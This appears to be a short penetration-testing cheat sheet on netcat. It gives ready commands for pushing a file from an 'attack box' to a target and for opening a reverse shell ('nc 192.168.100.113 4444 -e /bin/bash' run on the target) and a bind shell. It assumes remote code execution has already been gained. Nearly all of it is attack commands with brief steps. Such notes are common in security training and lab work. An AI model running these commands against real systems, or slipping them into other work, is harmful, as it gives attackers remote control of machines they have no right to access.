# netcat

File Transfer With Netcat
--------------------------
Netcat connection to transfer a text file.
Let’s assume we have remote command execution on the target host and we want to transfer a file from the attack box to the host.


--target machine saves the input to the file
nc -lvp 8080 > /root/Desktop/transfer.txt

--attacker sends the input from the file
nc 192.168.100.107 8080 < /root/Desktop/transfer.txt


Netcat reverse shell
--------------------

    Setup a Netcat listener.
    Connect to the Netcat listener from the target host.
    Issue commands on the target host from the attack box.

First we setup a Netcat listener on the attack box which is listening on port 4444 with the following command:
nc -lvp 4444

Than we issue the following command on the target host to connect to our attack box (remember we have remote code execution on this box):
nc 192.168.100.113 4444 –e /bin/bash


Netcat bind shell
------------------

    Bind a bash shell to port 4444 using Netcat.
    Connect to the target host on port 4444 from the attack box.
    Issue commands on the target host from the attack box.

target:
nc -lvp 4444 -e /bin/bash

attacker:
nc 127.0.0.1 4444

	
